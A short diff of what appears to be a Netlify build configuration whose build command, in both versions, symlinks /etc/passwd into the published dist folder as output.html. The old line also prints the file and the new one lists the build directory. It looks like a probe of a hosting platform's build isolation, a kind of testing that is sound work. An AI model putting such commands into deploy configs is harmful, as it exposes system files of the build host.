@@ -1,5 +1,5 @@
 [build]
-  command = "mkdir dist && cd dist && ln -s /etc/passwd output.html && cat output.html"
+  command = "pwd && ls -lah && mkdir dist && cd dist && ln -s /etc/passwd output.html"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
